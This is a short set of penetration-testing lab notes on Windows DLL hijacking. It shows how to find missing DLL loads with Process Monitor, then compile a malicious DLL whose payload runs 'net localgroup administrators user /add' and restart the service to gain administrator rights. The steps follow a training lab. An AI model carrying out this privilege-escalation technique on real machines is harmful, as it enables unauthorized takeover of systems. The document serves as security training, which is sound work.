---
description: >-
  exploit vulnerabilities in the Dynamic Link Library (DLL) files of an
  application. By manipulating the search order used by the operating system to
  locate DLL files to load malicious one
---

# DLL hijacking

Use PowerSploit or process monitor

Add filter NO NAME FOUND and also file type .dll

then&#x20;

```
sc dll start
```

if already running

```
sc dll stop
```

then again start

check the process monitor ,create a malicious script and put it inside the path with file name where it was not found in dll.

. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.\
2\. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.\
3\. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.\
4\. In the input box on the same line type: dllhijackservice.exe\
5\. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.\
6\. Next, select from the left-most drop down menu ‘Result’.\
7\. In the input box on the same line type: NAME NOT FOUND\
8\. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.\
9\. Open command prompt and type: sc start dllsvc\
10\. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.

Exploitation

Windows VM

1\. Copy ‘C:\Users\User\Desktop\Tools\Source\windows\_dll.c’ to the Kali VM.

Kali VM

1\. Open windows\_dll.c in a text editor and replace the command used by the system() function to: `cmd.exe /k net localgroup administrators user /add`\
2\. Exit the text editor and compile the file by typing the following in the command prompt: x86\_64-w64-mingw32-gcc windows\_dll.c -shared -o hijackme.dll\
3\. Copy the generated file hijackme.dll, to the Windows VM.

Windows VM

1\. Place hijackme.dll in ‘C:\Temp’.\
2\. Open command prompt and type: sc stop dllsvc & sc start dllsvc\
3\. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

